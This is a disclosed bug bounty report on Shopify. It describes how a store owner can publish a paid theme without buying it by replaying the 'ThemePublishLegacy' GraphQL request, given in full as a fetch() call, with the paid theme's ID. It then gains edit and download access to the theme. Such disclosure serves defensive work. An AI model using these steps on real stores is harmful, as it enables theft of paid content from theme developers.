# Ability to publish a paid theme without purchasing it.

## Report Details
- **Report ID**: 927567
- **URL**: https://hackerone.com/reports/927567
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-07-20T01:59:42.448Z
- **Disclosed**: 2020-08-27T19:41:33.735Z

## Reporter
- **Username**: saltymermaid
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

## Description
I found out that it is possible to publish a paid theme without purchasing it. I remember trying this some time ago and it seemed to be safe from this kind of attack.

## Steps to reproduce
1. Make sure you have the default theme installed and that it is published.
2. Install any *free* theme
3. Install any *paid* theme
4. Get the paid theme ID by clicking the "Customize" link and extract the ID from the url (https\://yourshop.myshopify.com/admin/themes/***[theme_id]***/editor) and save it for later.
5. Publish the free theme you install from step #2
6. From your developper tool, copy the "*ThemePublishLegacy*" XHR request as Fetch\

    ```
    fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
      "headers": {
        "accept": "application/json",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-online-store-web": "1"
      },
      "referrerPolicy": "no-referrer",
      "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation     ThemePublishLegacy($id: ID!) {\\n  onlineStoreThemePublish(id: $id) {\\n    theme {\\n      id\\n      __typename\\n    }\\n    userErrors {\\n      field\\n          message\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}",
      "method": "POST",
      "mode": "cors",
      "credentials": "include"
    });
```
7. Paste the request in your developer tool console and replace the free theme ID with the paid theme ID you save at step #4
 7.1. `..."body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/`**`[THEME_ID]`**`\"},\"query\":\"mutation...`
8. Refresh the page and you should see that the paid theme is now publish & active.

Also, after the theme is published, it seems like we own it. So, at this point, if you publish another theme (the free one), you should see that the the yellow "Theme trial"  badge is missing and that you can rename, edit and download the theme files.

## Impact

Ability to install paid theme without purchasing it could lead to content stealing and lost of profit. There is also some unwanted information disclosure since we can edit the theme code and download the files after its published.

If you need extra details, images or a POC video, please let me know!

Thank you!

## Attachments
No attachments
